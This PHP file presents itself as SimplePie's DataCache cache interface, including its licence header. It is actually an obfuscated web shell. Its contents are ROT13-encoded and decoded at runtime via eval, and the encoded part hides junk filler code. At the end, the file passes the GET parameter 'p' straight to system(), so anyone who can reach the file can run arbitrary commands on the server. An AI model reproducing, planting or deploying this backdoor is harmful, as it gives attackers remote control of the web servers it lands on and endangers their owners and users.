<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * FvzcyrCvr
 *
 * N CUC-Onfrq EFF naq Ngbz Srrq Senzrjbex.
 * Gnxrf gur uneq jbex bhg bs znantvat n pbzcyrgr EFF/Ngbz fbyhgvba.
 *
 * Pbclevtug (p) 2004-2022, Elna Cnezna, Fnz Farqqba, Elna ZpPhr, naq pbagevohgbef
 * Nyy evtugf erfreirq.
 *
 * Erqvfgevohgvba naq hfr va fbhepr naq ovanel sbezf, jvgu be jvgubhg zbqvsvpngvba, ner
 * crezvggrq cebivqrq gung gur sbyybjvat pbaqvgvbaf ner zrg:
 *
 * 	* Erqvfgevohgvbaf bs fbhepr pbqr zhfg ergnva gur nobir pbclevtug abgvpr, guvf yvfg bs
 * 	  pbaqvgvbaf naq gur sbyybjvat qvfpynvzre.
 *
 * 	* Erqvfgevohgvbaf va ovanel sbez zhfg ercebqhpr gur nobir pbclevtug abgvpr, guvf yvfg
 * 	  bs pbaqvgvbaf naq gur sbyybjvat qvfpynvzre va gur qbphzragngvba naq/be bgure zngrevnyf
 * 	  cebivqrq jvgu gur qvfgevohgvba.
 *
 * 	* Arvgure gur anzr bs gur FvzcyrCvr Grnz abe gur anzrf bs vgf pbagevohgbef znl or hfrq
 * 	  gb raqbefr be cebzbgr cebqhpgf qrevirq sebz guvf fbsgjner jvgubhg fcrpvsvp cevbe
 * 	  jevggra crezvffvba.
 *
 * GUVF FBSGJNER VF CEBIVQRQ OL GUR PBCLEVTUG UBYQREF NAQ PBAGEVOHGBEF \"NF VF\" NAQ NAL RKCERFF
 * BE VZCYVRQ JNEENAGVRF, VAPYHQVAT, OHG ABG YVZVGRQ GB, GUR VZCYVRQ JNEENAGVRF BS ZREPUNAGNOVYVGL
 * NAQ SVGARFF SBE N CNEGVPHYNE CHECBFR NER QVFPYNVZRQ. VA AB RIRAG FUNYY GUR PBCLEVTUG UBYQREF
 * NAQ PBAGEVOHGBEF OR YVNOYR SBE NAL QVERPG, VAQVERPG, VAPVQRAGNY, FCRPVNY, RKRZCYNEL, BE
 * PBAFRDHRAGVNY QNZNTRF (VAPYHQVAT, OHG ABG YVZVGRQ GB, CEBPHERZRAG BS FHOFGVGHGR TBBQF BE
 * FREIVPRF; YBFF BS HFR, QNGN, BE CEBSVGF; BE OHFVARFF VAGREEHCGVBA) UBJRIRE PNHFRQ NAQ BA NAL
 * GURBEL BS YVNOVYVGL, JURGURE VA PBAGENPG, FGEVPG YVNOVYVGL, BE GBEG (VAPYHQVAT ARTYVTRAPR BE
 * BGUREJVFR) NEVFVAT VA NAL JNL BHG BS GUR HFR BS GUVF FBSGJNER, RIRA VS NQIVFRQ BS GUR
 * CBFFVOVYVGL BS FHPU QNZNTR.
 *
 * @cnpxntr FvzcyrCvr
 * @pbclevtug 2004-2022 Elna Cnezna, Fnz Farqqba, Elna ZpPhr
 * @nhgube Elna Cnezna
 * @nhgube Fnz Farqqba
 * @nhgube Elna ZpPhr
 * @yvax uggc://fvzcyrcvr.bet/ FvzcyrCvr
 * @yvprafr uggc://jjj.bcrafbhepr.bet/yvprafrf/ofq-yvprafr.cuc OFQ Yvprafr
 */

anzrfcnpr FvzcyrCvr\Pnpur;

hfr VainyvqNethzragRkprcgvba;

/**
 * Fhofrg bs CFE-16 Pnpur pyvrag sbe pnpuvat qngn neenlf
 *
 * Bayl trg(), frg() naq qryrgr() zrgubqf ner hfrq,
 * ohg abg unf(), trgZhygvcyr(), frgZhygvcyr() be qryrgrZhygvcyr().
 *
 * Gur zrgubqf anzrf zhfg or qvssrerag, ohg fubhyq or pbzcngvoyr gb gur
 * zrgubqf bs \Cfe\FvzcyrPnpur\PnpurVagresnpr.
 *
 * @cnpxntr FvzcyrCvr
 * @fhocnpxntr Pnpuvat
 * @vagreany
 */
vagresnpr QngnPnpur
{
    /**
     * Srgpurf n inyhr sebz gur pnpur.
     *
     * Rdhvinyrag gb \Cfe\FvzcyrPnpur\PnpurVagresnpr::trg()
     * <pbqr>
     * choyvp shapgvba trg(fgevat $xrl, zvkrq $qrsnhyg = ahyy): zvkrq;
     * </pbqr>
     *
     * @cnenz fgevat   $xrl     Gur havdhr xrl bs guvf vgrz va gur pnpur.
     * @cnenz zvkrq    $qrsnhyg Qrsnhyg inyhr gb erghea vs gur xrl qbrf abg rkvfg.
     *
     * @erghea neenl|zvkrq Gur inyhr bs gur vgrz sebz gur pnpur, be $qrsnhyg va pnfr bs pnpur zvff.
     *
     * @guebjf VainyvqNethzragRkprcgvba
     *   ZHFG or guebja vs gur $xrl fgevat vf abg n yrtny inyhr.
     */
    choyvp shapgvba trg_qngn(fgevat $xrl, $qrsnhyg = ahyy);

    /**
     * Crefvfgf qngn va gur pnpur, havdhryl ersreraprq ol n xrl jvgu na bcgvbany rkcvengvba GGY gvzr.
     *
     * Rdhvinyrag gb \Cfe\FvzcyrPnpur\PnpurVagresnpr::frg()
     * <pbqr>
     * choyvp shapgvba frg(fgevat $xrl, zvkrq $inyhr, ahyy|vag|\QngrVagreiny $ggy = ahyy): obby;
     * </pbqr>
     *
     * @cnenz fgevat   $xrl   Gur xrl bs gur vgrz gb fgber.
     * @cnenz neenl    $inyhr Gur inyhr bs gur vgrz gb fgber, zhfg or frevnyvmnoyr.
     * @cnenz ahyy|vag $ggy   Bcgvbany. Gur GGY inyhr bs guvf vgrz. Vs ab inyhr vf frag naq
     *                                      gur qevire fhccbegf GGY gura gur yvoenel znl frg n qrsnhyg inyhr
     *                                      sbe vg be yrg gur qevire gnxr pner bs gung.
     *
     * @erghea obby Gehr ba fhpprff naq snyfr ba snvyher.
     *
     * @guebjf VainyvqNethzragRkprcgvba
     *   ZHFG or guebja vs gur $xrl fgevat vf abg n yrtny inyhr.
     */
    choyvp shapgvba frg_qngn(fgevat $xrl, neenl $inyhr, ?vag $ggy = ahyy): obby;

    /**
     * Qryrgr na vgrz sebz gur pnpur ol vgf havdhr xrl.
     *
     * Rdhvinyrag gb \Cfe\FvzcyrPnpur\PnpurVagresnpr::qryrgr()
     * <pbqr>
     * choyvp shapgvba qryrgr(fgevat $xrl): obby;
     * </pbqr>
     *
     * @cnenz fgevat $xrl Gur havdhr pnpur xrl bs gur vgrz gb qryrgr.
     *
     * @erghea obby Gehr vs gur vgrz jnf fhpprffshyyl erzbirq. Snyfr vs gurer jnf na reebe.
     *
     * @guebjf VainyvqNethzragRkprcgvba
     *   ZHFG or guebja vs gur $xrl fgevat vf abg n yrtny inyhr.
     */
    choyvp shapgvba qryrgr_qngn(fgevat $xrl): obby;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>